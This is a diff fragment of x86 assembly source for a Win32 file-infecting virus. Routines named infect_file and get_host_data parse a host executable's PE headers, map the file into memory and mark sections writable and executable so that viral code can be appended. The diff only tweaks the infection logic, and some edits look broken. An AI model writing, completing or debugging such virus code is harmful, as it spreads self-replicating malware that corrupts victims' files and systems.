@@ -152,6 +152,7 @@ infect_file:
     	call open_file
     	cmp eax,0
     	je open_fail
+    	mov ecx,dword ptr[ebp+win32_find_data.FileSizeLow]
     	call create_file_mapping
     	cmp eax,0
     	je create_file_mapping_fail
@@ -188,19 +189,19 @@ get_host_data:
 	add eax,6
 	mov esi,eax
 	mov eax,[eax]
-	mov [ebp+host_no_sect],al   ; number of sections 
+	mov dword ptr[ebp+host_no_sect],eax   ; number of sections 
 	
 	mov eax,esi
 	add eax,14
 	mov esi,eax
 	mov eax,[eax]
-	mov [ebp+host_opt_size],al	; option header size
+	mov dword ptr[ebp+host_opt_size],eax  	; option header size
 	
 	mov eax,esi
 	add eax,36
 	mov esi,eax
 	mov eax,[eax]
-	mov [ebp+host_sec_alig],eax
+	mov dword ptr[ebp+host_sec_alig],eax
 	
 	mov eax,esi
 	add eax,4
@@ -209,7 +210,7 @@ get_host_data:
 	mov [ebp+host_sec_alig],eax
 	
 	;mov eax,[ebp+host_sec_alig]
-	mov dl,[ebp+host_no_sect]
+	lea eax,[ebp+host_no_sect]
 	mul edx
 	
 	push eax
@@ -255,7 +256,7 @@ get_host_data:
 	mov dword ptr[eax],'quan'
 	mov eax,[ebp+host_rel_tab]
 	add eax,24
-	mov dword ptr[eax],0xF0000060;F0000060h
+	;mov dword ptr[eax],0xF0000060;F0000060h
 	
 	mov eax,ecx
 	add eax,18h
@@ -268,7 +269,7 @@ get_host_data:
 	mov ax,[ebp+host_no_sect]
 	push ecx
 	sub ecx,ecx
-	mov cx,[ebp+host_file_alig]
+	mov ecx,[ebp+host_file_alig]
 	mul cx
 	pop ecx
 	push eax
@@ -299,18 +300,15 @@ open_file:
     	mov dword ptr[ebp+file_handle],eax 
    	ret
 create_file_mapping:
+	xor eax,eax
+	push eax
     	push ecx
-    	lea ecx,[ebp+virus_size]
-    	add ecx,[ebp+win32_find_data.FileSizeLow]
-    	push 0
-    	push ecx
-    	push 0
-    	push 4
-    	push 0
+    	push eax
+    	push 04h
+    	push eax
     	push dword ptr[ebp+file_handle]
     	call [ebp+CreateFileMappingAAddress]
     	mov dword ptr[ebp+file_map_handle],eax
-    	pop ecx
     	ret
 map_into_mem:
     	push dword ptr[ebp+win32_find_data.FileSizeHigh]
